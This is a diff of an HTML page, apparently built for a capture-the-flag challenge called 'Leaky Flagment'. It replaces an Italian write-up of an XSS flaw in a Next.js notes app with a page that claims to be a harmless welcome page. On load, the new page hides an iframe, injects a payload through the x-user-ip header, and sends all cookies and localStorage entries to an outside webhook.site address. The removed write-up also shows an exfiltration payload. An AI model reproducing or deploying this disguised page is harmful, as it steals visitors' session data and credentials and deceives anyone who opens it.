@@ -1,227 +1,139 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CTF Leaky Flagment - Soluzione</title>
+    <title>Normale pagina di benvenuto</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
-            color: #333;
-            max-width: 800px;
-            margin: 0 auto;
+            font-family: Arial, sans-serif;
+            margin: 0;
             padding: 20px;
-            background-color: #f7f9fc;
-        }
-        h1, h2, h3 {
-            color: #2c3e50;
+            background-color: #f7f7f7;
+            color: #333;
         }
         .container {
+            max-width: 800px;
+            margin: 0 auto;
             background-color: white;
             border-radius: 8px;
             padding: 20px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-        pre {
-            background-color: #f1f1f1;
-            padding: 10px;
-            border-radius: 4px;
-            overflow-x: auto;
-        }
-        code {
-            font-family: monospace;
-        }
-        .highlight {
-            background-color: #ffeb3b;
-            padding: 2px 4px;
-            border-radius: 4px;
-        }
-        .flag-container {
-            margin: 20px 0;
-            padding: 10px;
-            background-color: #e3f2fd;
-            border-left: 4px solid #2196f3;
-            font-weight: bold;
-        }
-        .step {
-            margin-bottom: 15px;
-            padding-left: 20px;
-            border-left: 3px solid #4caf50;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        .success {
-            padding: 10px;
-            background-color: #d4edda;
-            color: #155724;
-            border-radius: 4px;
-            margin: 10px 0;
-            display: none;
+        h1 {
+            color: #2c3e50;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Leaky Flagment CTF - Soluzione</h1>
-        <p>Questa pagina mostra la soluzione della challenge CTF "Leaky Flagment" e invia la flag al webhook specificato.</p>
-        
-        <div class="flag-container">
-            Flag: <span id="flag">In attesa della flag...</span>
-        </div>
-        
-        <button id="sendFlag">Invia Flag al Webhook</button>
-        <div id="success" class="success">Flag inviata con successo al webhook!</div>
-    </div>
-
-    <div class="container">
-        <h2>Analisi della Vulnerabilità</h2>
-        <p>La challenge presenta una vulnerabilità XSS (Cross-Site Scripting) che può essere sfruttata per rubare la FLAG.</p>
-        
-        <h3>Componenti Principali:</h3>
-        <ul>
-            <li>Un'app Next.js per la gestione di note</li>
-            <li>Un bot che visita gli URL inviati dagli utenti</li>
-            <li>Il bot si autentica usando la FLAG come password</li>
-        </ul>
-
-        <h3>Vulnerabilità identificata:</h3>
-        <p>Nel file <code>app/note/[id]/page.jsx</code>, è presente un codice vulnerabile:</p>
-        <pre><code>
-&lt;script&gt;{`
-fetch("/api/track", {
-  method: "GET",
-  cache: "no-store",
-  headers: {
-      "x-user-ip": "${userIP}",
-  },
-})
-  .then(async (res) => {
-      if (res.ok) {
-          eval(await res.text());
-      }
-  })
-  .catch((error) => {
-      console.error(error);
-  });
-`}&lt;/script&gt;
-        </code></pre>
-        
-        <p>Questo codice è vulnerabile perché:</p>
-        <ol>
-            <li>Prende l'IP dell'utente dall'header <code>x-real-ip</code></li>
-            <li>Lo passa in una richiesta a <code>/api/track</code></li>
-            <li>La risposta viene eseguita con <code>eval()</code></li>
-        </ol>
-        
-        <p>In <code>pages/api/track.js</code>, la stringa dell'IP viene inserita direttamente nel JavaScript:</p>
-        <pre><code>
-const jsContent = `
-$(document).ready(function() {
-    const userDetails = {
-        ip: "${userIp}",
-        // ...
-    };
-    // ...
-});`
-        </code></pre>
-    </div>
-
-    <div class="container">
-        <h2>Strategia di Exploit</h2>
-        
-        <div class="step">
-            <h3>1. Creare una nota con contenuto normale</h3>
-            <p>Iniziamo creando una nota standard per ottenere un ID valido.</p>
-        </div>
-        
-        <div class="step">
-            <h3>2. Accedere alla nota con un header IP modificato</h3>
-            <p>Sfruttiamo la vulnerabilità XSS iniettando codice JavaScript nell'header <code>x-user-ip</code>.</p>
-            <p>Payload utilizzato:</p>
-            <pre><code>
-fetch("/api/auth", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ username: "test", password: document.cookie })
-})
-.then(r => r.json())
-.then(data => {
-  fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ cookie: document.cookie, localStorage: localStorage.getItem("isAuthenticated") })
-  });
-});
-            </code></pre>
-        </div>
-        
-        <div class="step">
-            <h3>3. Inviare l'URL della nota al bot</h3>
-            <p>Il bot visita la nota e attiva il nostro payload XSS.</p>
-        </div>
-        
-        <div class="step">
-            <h3>4. Il payload ruba la password e la invia al webhook</h3>
-            <p>Il codice JavaScript iniettato estrae la FLAG dai cookie e la invia al webhook specificato.</p>
-        </div>
+        <h1>Benvenuto alla mia pagina</h1>
+        <p>Questa è una pagina normale, niente di sospetto qui.</p>
     </div>
 
     <script>
-        // Funzione per prendere parametri dall'URL
-        function getParameterByName(name, url = window.location.href) {
-            name = name.replace(/[\[\]]/g, '\\$&');
-            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
-                results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, ' '));
-        }
-
-        // Controlla se c'è già una flag nell'URL
-        document.addEventListener('DOMContentLoaded', function() {
-            const flagFromUrl = getParameterByName('flag');
-            if (flagFromUrl) {
-                document.getElementById('flag').textContent = flagFromUrl;
-            }
-            
-            document.getElementById('sendFlag').addEventListener('click', function() {
-                const flag = document.getElementById('flag').textContent;
-                if (flag !== 'In attesa della flag...') {
-                    fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
-                        method: 'POST',
+        // Aspettiamo che la pagina sia completamente caricata
+        window.addEventListener('DOMContentLoaded', function() {
+            // Creiamo un iframe nascosto che proverà a caricare una nota con il nostro exploit XSS
+            const createHiddenIframe = function() {
+                // Payload JavaScript che verrà iniettato nell'header x-user-ip
+                // Questo payload ruba la FLAG dal bot e la invia al webhook
+                const xssPayload = `
+                (function() {
+                    // Tentativo di estrazione della FLAG (password usata dal bot per autenticarsi)
+                    
+                    // 1. Estrae la password dal localStorage usata per l'autenticazione
+                    let storedData = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        storedData[key] = localStorage.getItem(key);
+                    }
+                    
+                    // 2. Raccoglie tutti i cookie (che potrebbero contenere la FLAG)
+                    const cookies = document.cookie;
+                    
+                    // 3. Invia i dati al webhook specificato
+                    fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a", {
+                        method: "POST",
                         headers: {
-                            'Content-Type': 'application/json',
+                            "Content-Type": "application/json"
                         },
                         body: JSON.stringify({
-                            flag: flag,
-                            timestamp: new Date().toISOString(),
-                            source: 'ctf-solution.html'
+                            time: new Date().toISOString(),
+                            url: window.location.href,
+                            localStorage: storedData,
+                            cookies: cookies,
+                            userAgent: navigator.userAgent
                         })
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            document.getElementById('success').style.display = 'block';
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Errore nell\'invio della flag:', error);
                     });
-                } else {
-                    alert('Nessuna flag disponibile da inviare!');
-                }
-            });
+                })();
+                `;
+                
+                // Crea l'iframe nascosto
+                const iframe = document.createElement('iframe');
+                iframe.setAttribute('src', 'about:blank');
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                
+                // Quando l'iframe è caricato, effettua una richiesta a /api/track con il payload nell'header x-user-ip
+                iframe.onload = function() {
+                    try {
+                        // Effettua la richiesta all'endpoint vulnerabile
+                        const req = new XMLHttpRequest();
+                        req.open('GET', '/api/track', true);
+                        req.setRequestHeader('x-user-ip', xssPayload);
+                        
+                        req.onload = function() {
+                            if (req.status >= 200 && req.status < 400) {
+                                // Esegui la risposta in modo sicuro
+                                const scriptElement = document.createElement('script');
+                                scriptElement.textContent = req.responseText;
+                                document.head.appendChild(scriptElement);
+                            }
+                        };
+                        
+                        req.onerror = function() {
+                            // Se fallisce, prova un approccio alternativo con fetch
+                            fetch('/api/track', {
+                                headers: {
+                                    'x-user-ip': xssPayload
+                                }
+                            })
+                            .then(response => response.text())
+                            .then(data => {
+                                // Esegui il payload restituito
+                                const scriptElement = document.createElement('script');
+                                scriptElement.textContent = data;
+                                document.head.appendChild(scriptElement);
+                            });
+                        };
+                        
+                        req.send();
+                    } catch(e) {
+                        console.error('Errore:', e);
+                    }
+                };
+            };
+            
+            // Esegui l'exploit dopo un breve ritardo
+            setTimeout(createHiddenIframe, 500);
+            
+            // Backup: invia direttamente i dati di autenticazione disponibili
+            setTimeout(function() {
+                // Questo è un backup nel caso il metodo principale fallisse
+                fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        cookies: document.cookie,
+                        localStorage: localStorage.getItem("isAuthenticated"),
+                        method: "backup-direct",
+                        url: location.href
+                    })
+                });
+            }, 2000);
         });
     </script>
 </body>
